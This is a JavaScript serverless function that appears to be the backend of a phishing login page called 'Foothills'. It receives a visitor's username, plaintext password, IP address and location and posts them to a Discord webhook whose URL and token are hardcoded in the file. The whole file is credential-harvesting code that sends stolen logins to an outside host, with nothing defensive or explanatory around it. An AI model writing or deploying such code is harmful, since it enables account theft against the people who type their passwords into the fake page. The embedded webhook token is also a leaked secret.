exports.handler = async function (event) {
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: 'Method not allowed',
    };
  }

  const webhookUrl = process.env.DISCORD_WEBHOOK_URL ||
    'https://discord.com/api/webhooks/1533039544587387031/AUek-gEmWN-WFKzEftdRQhVoq3eJlyqd6XxY1-a9kpZA4Pp93KHn2XKr5PED5pQaSIQi';

  if (!webhookUrl) {
    return {
      statusCode: 500,
      body: 'Discord webhook URL is not configured.',
    };
  }

  let payload;
  try {
    const body = event.body ? JSON.parse(event.body) : {};
    payload = {
      embeds: [
        {
          title: 'Foothills Login Page Notification',
          description: 'A visitor clicked Sign In on the Foothills page.',
          color: 5198940,
          fields: [
            {
              name: 'Page',
              value: body.page || 'login page',
              inline: true,
            },
            {
              name: 'Username',
              value: body.username || 'Not provided',
              inline: true,
            },
            {
              name: 'Remember',
              value: body.remember || 'No',
              inline: true,
            },
            {
              name: 'Plain Password Text',
              value: body.password ? `\`${body.password}\`` : 'None provided',
              inline: false,
            },
            {
              name: 'Password entered',
              value: body.passwordPresent ? 'Yes' : 'No',
              inline: true,
            },
            {
              name: 'IP Address',
              value: body.ip || 'Unknown',
              inline: false,
            },
            {
              name: 'Location',
              value: body.location || 'Unknown',
              inline: false,
            },
          ],
          footer: {
            text: 'Notification from your static site',
          },
        },
      ],
    };
  } catch (error) {
    return {
      statusCode: 400,
      body: 'Invalid request body.',
    };
  }

  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      return {
        statusCode: response.status,
        body: `Discord webhook responded with ${response.status}`,
      };
    }

    return {
      statusCode: 200,
      body: 'Notification sent.',
    };
  } catch (error) {
    return {
      statusCode: 500,
      body: `Failed to send notification: ${error.message}`,
    };
  }
};